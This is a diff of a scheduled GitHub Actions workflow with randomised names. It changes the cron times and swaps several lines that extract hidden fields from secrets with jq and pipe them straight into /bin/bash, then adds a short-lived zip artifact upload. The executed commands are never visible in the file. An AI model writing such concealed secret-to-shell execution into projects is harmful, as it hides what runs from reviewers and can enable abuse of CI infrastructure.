@@ -1,24 +1,25 @@
 name: huazoujujin
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '28 2/6 * * *'
 
-jobs:  # 31733
+  schedule:
+    - cron: '14 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: huazoujujin
         env:
-          vvyf1: ${{ secrets.vvyf1 }}
+          v66683: ${{ secrets.v66683 }}
         run: |
-          echo $vvyf1 | jq -r .vxfef0442 | /bin/bash
-          echo $d14 | jq -r .qx55 | /bin/bash
-          echo $d1312 | jq -r .xpiqp09 | /bin/bash
-          echo $onmey6 | jq -r .jvsf2703 | /bin/bash
-          echo $xa3279 | jq -r .cvonp1 | /bin/bash
-          echo $f28142 | jq -r .rx12 | /bin/bash
-          echo $urmjg557 | jq -r .xt6 | /bin/bash
-          echo $dhy23 | jq -r .a2 | /bin/bash
+          printf '%s' "$v66683" | jq -r .pcbdt570 | /bin/bash
+          echo $xkamq91787 | jq -r .dhkmk2 | /bin/bash
+          printf '%s' "$smt9487" | jq -r .b70657 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: F0vXeQZC
+          path: "*.zip"
+          retention-days: 1
